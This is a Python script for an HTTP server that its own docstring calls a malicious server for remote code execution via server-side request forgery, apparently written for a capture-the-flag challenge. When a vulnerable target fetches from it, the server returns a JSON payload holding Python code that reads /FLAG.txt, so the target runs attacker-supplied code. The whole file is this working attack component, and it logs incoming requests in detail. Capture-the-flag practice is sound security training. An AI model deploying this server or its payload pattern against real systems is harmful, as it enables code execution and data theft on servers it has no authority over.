#!/usr/bin/env python3
"""
Malicious HTTP server for RCE exploitation via SSRF
Serves JSON payload to extract /FLAG.txt content
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys
from datetime import datetime

class MaliciousHandler(BaseHTTPRequestHandler):
    """HTTP handler serving malicious JSON payload"""
    
    def log_message(self, format, *args):
        """Custom logging to stdout"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        sys.stdout.write(f"[{timestamp}] {format % args}\n")
        sys.stdout.flush()
    
    def handle_request(self, method):
        """Common handler for GET/POST requests"""
        try:
            print(f"\n{'='*60}")
            print(f"[INCOMING REQUEST]")
            print(f"  Method: {method}")
            print(f"  Path: {self.path}")
            print(f"  Client: {self.client_address[0]}:{self.client_address[1]}")
            print(f"  Headers:")
            for header, value in self.headers.items():
                print(f"    {header}: {value}")
            
            # Read POST body if present
            if method == "POST":
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length > 0:
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    print(f"  Body: {post_data}")
            
            # Malicious payload to extract /FLAG.txt
            payload = {
                "script": "open('/FLAG.txt').read()"
            }
            
            json_payload = json.dumps(payload)
            json_bytes = json_payload.encode('utf-8')
            
            # Send response
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(json_bytes)))
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Connection', 'close')
            self.end_headers()
            
            # Write JSON payload
            self.wfile.write(json_bytes)
            self.wfile.flush()
            
            print(f"\n[RESPONSE SENT]")
            print(f"  Status: 200 OK")
            print(f"  Content-Type: application/json")
            print(f"  Payload: {json_payload}")
            print(f"{'='*60}\n")
            
        except Exception as e:
            print(f"[ERROR] Exception during request handling: {e}")
            try:
                self.send_error(500, f"Internal Server Error: {e}")
            except:
                pass
    
    def do_GET(self):
        """Handle GET requests"""
        self.handle_request("GET")
    
    def do_POST(self):
        """Handle POST requests"""
        self.handle_request("POST")
    
    def do_OPTIONS(self):
        """Handle OPTIONS requests (CORS preflight)"""
        try:
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', '*')
            self.end_headers()
        except:
            pass

def run_server(host='0.0.0.0', port=8000):
    """Start the malicious HTTP server"""
    server_address = (host, port)
    
    print("\n" + "="*60)
    print("[MALICIOUS RCE HTTP SERVER]")
    print("="*60)
    print(f"Host: {host}")
    print(f"Port: {port}")
    print(f"Payload: {json.dumps({'script': 'open(\"/FLAG.txt\").read()'})}")
    print(f"Status: READY")
    print("="*60 + "\n")
    print("[INFO] Server is running and waiting for requests...")
    print("[INFO] Press Ctrl+C to stop\n")
    
    httpd = HTTPServer(server_address, MaliciousHandler)
    httpd.timeout = None
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[SHUTDOWN] Stopping server...")
        httpd.shutdown()
        httpd.server_close()
        print("[STOPPED] Server stopped gracefully")
    except Exception as e:
        print(f"\n[FATAL ERROR] {e}")
        try:
            httpd.shutdown()
            httpd.server_close()
        except:
            pass

if __name__ == '__main__':
    run_server()

